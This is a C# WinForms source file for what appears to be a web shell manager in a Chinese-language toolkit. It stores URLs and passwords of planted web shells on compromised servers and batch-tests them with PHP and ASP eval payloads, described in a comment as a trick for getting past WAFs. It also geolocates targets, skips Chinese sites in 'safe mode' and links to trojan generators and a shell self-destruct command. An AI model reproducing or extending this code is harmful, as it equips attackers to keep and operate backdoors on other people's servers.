using C2.Core;
using C2.Utils;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static C2.Utils.GuarderUtil;

namespace C2.Business.CastleBravo.WebShellTool
{
    public partial class WebShellManageForm : Form
    {
        public static ProxySetting Proxy { get; set; } = ProxySetting.Empty;
        private int NumberOfAlive { get; set; }
        private int NumberOfHost { get => setOfHost.Count; }
        private int NumberOfIPAddress { get => setOfIPAddress.Count; }

        private HashSet<string> setOfIPAddress;
        private HashSet<string> setOfHost;

        List<WebShellTaskConfig> tasks = new List<WebShellTaskConfig>();
        readonly string configFFP = Path.Combine(Application.StartupPath, "Resources", "WebShellConfig", "config.db");

        private ToolStripItem[] enableItems;

        private DateTime s; // 自动保存
        public WebShellManageForm()
        {
            InitializeComponent();
            InitializeToolStrip();
            InitializeOther();
        }

        private void ResetSLabel()
        {
            ItemCountSLabel.Text = string.Format("共{0}项", LV.Items.Count);
            ProxyEnableSLabel.Text = "代理" + (Proxy.Enable ? "启用" : "关闭");
        }
        private void InitializeOther()
        {
            setOfHost = new HashSet<string>();
            setOfIPAddress = new HashSet<string>();
            NumberOfAlive = 0;
        }

        private void InitializeToolStrip()
        {
            // 批量验活时, 与其他菜单项互斥
            enableItems = new ToolStripItem[]
            {
                this.addBatchShellMenu,
                this.proxySettingMenu,
                this.refreshAllShellMenu,
                this.refreshOtherMenu2,
                this.secondRefreshMenu,
                this.addOneShellMenu,
                this.trojanMenu
            };
        }

        private void AddShellMenu_Click(object sender, EventArgs e)
        {
            WebShellTaskConfig config = new AddWebShellForm().ShowDialog(ST.NowString());
            if (config == WebShellTaskConfig.Empty)
                return;

            LV.Items.Add(NewLVI(config));
            tasks.Add(config);
            SaveDB();
        }

        private void RefreshTasks()
        {
            tasks.Clear();
            foreach (ListViewItem lvi in LV.Items)
            {
                WebShellTaskConfig config = new WebShellTaskConfig(GetSubItemsTextArray(lvi));
                lvi.Tag = config; // 关联
                tasks.Add(config);// 数据库配置
            }
        }

        private string[] GetSubItemsTextArray(ListViewItem lvi)
        {
            List<string> array = new List<string>(lvi.SubItems.Count);
            for (int i = 0; i < lvi.SubItems.Count; i++)
                array.Add(lvi.SubItems[i].Text);
            return array.ToArray();
        }

        private void ClearAll()
        {
            tasks.Clear();
            RefreshLV();
            SaveDB();
        }

        private void SaveDB()
        {
            ResetSLabel();
            StaticItems();
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Create))
                   new BinaryFormatter().Serialize(stream, tasks);
            }
            catch { }
        }

        private void WebShellManageForm_Load(object sender, EventArgs e)
        {
            LoadDB();
            RefreshLV();
            ResetSLabel();
            StaticItems();
        }

        private void LoadDB()
        {
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Open))
                    tasks = new BinaryFormatter().Deserialize(stream) as List<WebShellTaskConfig>;
            }
            catch { }
        }

        public void RefreshLV()
        {
            LV.Items.Clear();  // 不能删表头的clear方法
            foreach (WebShellTaskConfig config in tasks)
                LV.Items.Add(NewLVI(config));
        }

        static bool isAlertnatingRows = true;
        private static ListViewItem NewLVI(WebShellTaskConfig config)
        {
            ListViewItem lvi = new ListViewItem(config.CreateTime);
            lvi.SubItems.Add(config.Remark);
            lvi.SubItems.Add(config.Url);
            lvi.SubItems.Add(config.Password);
            lvi.SubItems.Add(config.TrojanType);
            lvi.SubItems.Add(config.Status);
            lvi.SubItems.Add(config.ClientVersion);
            lvi.SubItems.Add(config.DatabaseConfig);
            lvi.SubItems.Add(config.IP);
            lvi.SubItems.Add(config.Country);
            lvi.SubItems.Add(config.Country2);

            // 指针关联
            lvi.Tag = config;
            // 设置间隔行背景色
            lvi.BackColor = isAlertnatingRows ? Color.FromArgb(255, 217, 225, 242) : Color.FromArgb(255, 208, 206, 206);
            isAlertnatingRows = !isAlertnatingRows;
            return lvi;
        }

        private void EnterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            new WebShellDetailsForm(LV.SelectedItems[0].Tag as WebShellTaskConfig).ShowDialog();
        }

        private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {

            foreach (ListViewItem lvi in LV.SelectedItems)
                lvi.Remove();
            RefreshTasks();
            SaveDB();
        }

        private void EditToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig old = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellTaskConfig cur = new AddWebShellForm().ShowDialog(old);

            if (cur == WebShellTaskConfig.Empty)
                return;

            LV.SelectedItems[0].Tag = cur;
            LV.SelectedItems[0].SubItems[1].Text = cur.Remark;         // 名称
            LV.SelectedItems[0].SubItems[2].Text = cur.Url;            // url
            LV.SelectedItems[0].SubItems[3].Text = cur.Password;       // 密码
            LV.SelectedItems[0].SubItems[4].Text = cur.TrojanType;     // 木马类型
            LV.SelectedItems[0].SubItems[5].Text = cur.Status;         // 木马状态
            LV.SelectedItems[0].SubItems[6].Text = cur.ClientVersion;  // 客户端版本
            LV.SelectedItems[0].SubItems[7].Text = cur.DatabaseConfig; // 数据库配置
            LV.SelectedItems[0].SubItems[8].Text = cur.IP;             // 目标IP
            LV.SelectedItems[0].SubItems[9].Text = cur.Country;        // 归属地
            LV.SelectedItems[0].SubItems[10].Text = cur.Country2;      // 归属地
            // 按道理不会出现索引越界
            tasks[tasks.IndexOf(old)] = cur;
            SaveDB();
        }
        private void LV_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            EditToolStripMenuItem_Click(sender, e);
        }

        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // 复制当前的选中单元格到粘贴板
            if (this.LV.SelectedItems.Count == 0)
                return;

            StringBuilder sb = new StringBuilder();
            foreach (ListViewItem lvi in this.LV.SelectedItems)
            {
                for (int i = 0; i < lvi.SubItems.Count; i++)
                    sb.Append(lvi.SubItems[i].Text).Append(OpUtil.TabSeparator);
                sb.TrimEndT().AppendLine();
            }
            FileUtil.TryClipboardSetText(sb.ToString());
        }


        private void TrojanGeneratorMenuItem_Click(object sender, EventArgs e)
        {
            string type = (sender as ToolStripMenuItem).ToolTipText.Split('|')[0];
            new TrojanGeneratorForm(type).ShowDialog();
        }

        private void GodzillaTrojanGeneratorMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("哥斯拉配套Trojan", true).ShowDialog();
        }


        private void RefreshCurrentStatusMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            UpdateAliveItems(LV.SelectedItems[0]);
            RefreshTasks();
            SaveDB();
        }

        private void RefreshAllStatusMenuItem_Click(object sender, EventArgs e)
        {
            RefreshAllTaskStatus(false);
        }

        private bool refreshNeedStop = false;

        private void RefreshStopMenu_Click(object sender, EventArgs e)
        {
            refreshNeedStop = true;
        }

        private void SecondRefreshTaskStatus()
        {
            ResetProgressMenu();

            foreach (ListViewItem lvi in LV.Items)
            {   // 没启用跳过尸体, 清空 或 死状态 清空
                if (lvi.SubItems[5].Text.In(new string[] { "×", "待"}))
                    lvi.SubItems[5].Text = "待";
                else
                    this.progressBar.Maximum--;
            }
            RefreshAll(true, false);
            EndRefresh();
        }

        private void RefreshAllTaskStatus(bool safeMode)
        {   // 刷新前先强制清空
            ResetProgressMenu();

            foreach (ListViewItem lvi in LV.Items)
                ClearAliveItems(lvi);
            
            RefreshAll(false, safeMode);
            EndRefresh();
        }

        private void RefreshAll(bool skipAlive, bool safeMode)
        {
            s = DateTime.Now;
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            foreach (ListViewItem lvi in LV.Items)
            {
                if (refreshNeedStop)
                    break;
                // 启用二刷
                if (skipAlive && lvi.SubItems[5].Text != "待")
                    continue;
                UpdateAliveItems(lvi, safeMode);
                UpdateProgress();
                CheckSavePoint(); // 5分钟保存一次
            }
        }

        private void EndRefresh()
        {
            RefreshTasks();
            SaveDB();
        }

        private void CheckSavePoint()
        {
            TimeSpan gap = DateTime.Now - s;
            if (gap.TotalMinutes >= 5)
            {   // 5分钟保存一次
                RefreshTasks();
                SaveDB();
                s = DateTime.Now;
            }
        }

        private void ResetProgressMenu()
        {
            this.progressMenu.Text = string.Empty;
            this.progressBar.Value = 0;
            this.progressBar.Maximum = LV.Items.Count;
            this.refreshNeedStop = false;
            this.NumberOfAlive = 0;
            this.setOfIPAddress.Clear();
            this.setOfHost.Clear();
        }

        private void UpdateAliveItems(ListViewItem lvi, bool safeMode = false)
        {
            WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
            string rts = RefreshTaskStatus(task, safeMode);
            
            if (rts == "√")
            {
                this.NumberOfAlive++;
                this.setOfHost.Add(NetUtil.GetHostByUrl(task.Url));
                this.setOfIPAddress.Add(task.IP);
            }
            lvi.SubItems[5].Text = rts;
            lvi.SubItems[8].Text = task.IP;
            lvi.SubItems[9].Text = task.Country;
            lvi.SubItems[10].Text = task.Country2;
            lvi.ListView.RedrawItems(lvi.Index, lvi.Index, false);
        }
        private void UpdateProgress()
        {
            this.progressMenu.Text = string.Format("{0}/{1} - 活 {2} - 站 {3} - IP {4}", 
                ++progressBar.Value, 
                progressBar.Maximum,
                NumberOfAlive,
                NumberOfHost,
                NumberOfIPAddress);
        }

        private static void ClearAliveItems(ListViewItem lvi)
        {
            lvi.SubItems[5].Text = string.Empty;
            lvi.SubItems[8].Text = string.Empty;
            lvi.SubItems[9].Text = string.Empty;
            lvi.SubItems[10].Text = string.Empty;
        }

        private string RefreshTaskStatus(WebShellTaskConfig task, bool safeMode)
        {
            string status = "×";
            using (GuarderUtil.WaitCursor) 
            {
                
                // safe模式下 跳过国内网站
                bool isChina = RefreshIPAddress(task);
                if (safeMode && isChina)
                    return "跳";

                // 我总结的print穿透WAF大法
                if (PostPrintTimeout(task))
                    return "√";   
            }
            return status;
        }

        private bool PostPrintTimeout(WebShellTaskConfig task, int timeout = 5)
        {   // WebClient的超时是响应超时, 但有时候网页会有响应,但加载慢, 需要整体超时控制
            var t = Task.Run(() => CheckAlive(task));
            // 代理慢, timeout富裕一些
            timeout = Proxy == ProxySetting.Empty ? timeout : timeout * 2;

            for (int i = 0; i < timeout; i++)
            {
                Application.DoEvents();
                if (t.Wait(1000))
                    return t.Result;
            }
            return false;
        }

        private bool RefreshIPAddress(WebShellTaskConfig task)
        {
            // 二刷时直接利用上次IP结果,加速
            if (task.Status != "待")
            {
                Application.DoEvents();
                task.IP = NetUtil.GetHostAddresses(task.Url);
                Application.DoEvents();
                task.Country = NetUtil.IPQuery_WhoIs(task.IP);
                Application.DoEvents();
                task.Country2 = NetUtil.IPQuery_ChunZhen(task.IP);
                Application.DoEvents();
            }

            return NetUtil.IsChina(task.Country) || NetUtil.IsChina(task.Country2);
        }

        private bool CheckAlive(WebShellTaskConfig task)
        {
            try
            {
                string url = NetUtil.FormatUrl(task.Url);
                string pass = task.Password;
                string seed = RandomUtil.RandomInt(31415000, 31415926).ToString();
                string payload = task.TrojanType == "phpEval" ? string.Format("=print({0});", seed) :
                                 task.TrojanType == "aspEval" ? string.Format("=response.write({0})", seed) :
                                 string.Empty;

                string result = WebClientEx.Post(url, pass + payload, 1500, Proxy);
                return result.Contains(seed);
            } catch { return false; }
            
        }

        private void AddAllShellMenu_Click(object sender, EventArgs e)
        {
            AddAllWebShellForm dialog = new AddAllWebShellForm();
            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            foreach(WebShellTaskConfig task in dialog.Tasks)
            {
                if (task == WebShellTaskConfig.Empty)
                    continue;

                LV.Items.Add(NewLVI(task));
                tasks.Add(task);
            }
            SaveDB();
        }

        private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClearAll();
        }

        private void SuscideMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig config = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellClient client = new WebShellClient(config.Url, config.Password, config.ClientVersion);
            client.Suscide();
            RemoveToolStripMenuItem_Click(sender, e);
        }

        private void ProxyMenu_Click(object sender, EventArgs e)
        {
            Proxy = new ProxySettingForm(Proxy).ShowDialog();
            ResetSLabel();
        }

        private void SaveResultsMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "文本文件|*.txt";
            dialog.FileName = "D洞管理" + DateTime.Now.ToString("yyyyMMddHHmm") + ".txt";

            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            using (GuarderUtil.WaitCursor)
                SaveResultToLocal(dialog.FileName);
        }

        private void SaveResultToLocal(string path)
        {
            StreamWriter sw = new StreamWriter(path, false); 
            try
            {
                List<string> tmpLists = new List<string>();
                foreach (ListViewItem lvi in LV.Items)
                {
                    tmpLists.Clear();
                    for (int i = 0; i < lvi.SubItems.Count; i++)
                        tmpLists.Add(lvi.SubItems[i].Text.Replace("\r\n"," "));
                    sw.WriteLine(string.Join("\t", tmpLists.ToArray()));
                }
            }
            catch { }
            finally
            {
                if (sw != null)
                    sw.Close();
            }
        }

        private void RefreshAllDeadMenu_Click(object sender, EventArgs e)
        {
            SecondRefreshTaskStatus();
        }

        private void RefreshOtherMenu_Click(object sender, EventArgs e)
        {
            RefreshAllTaskStatus(true);
        }

        private void WebShellManageForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.refreshNeedStop = true;
            using (GuarderUtil.WaitCursor)
            {
                RefreshTasks();
                SaveDB();
            }
        }

        private void StaticItems()
        {
            int dead = 0;
            int alive = 0;

            foreach (ListViewItem lvi in LV.Items)
            {
                switch(lvi.SubItems[5].Text)
                {
                    case "√":
                        alive++;
                        break;
                    case "×":
                        dead++;
                        break;
                    default:
                        break;
                }
            }
            StatusLabel.Text = string.Format("活 {0} - 死 {1}", alive, dead);
        }
    }
}
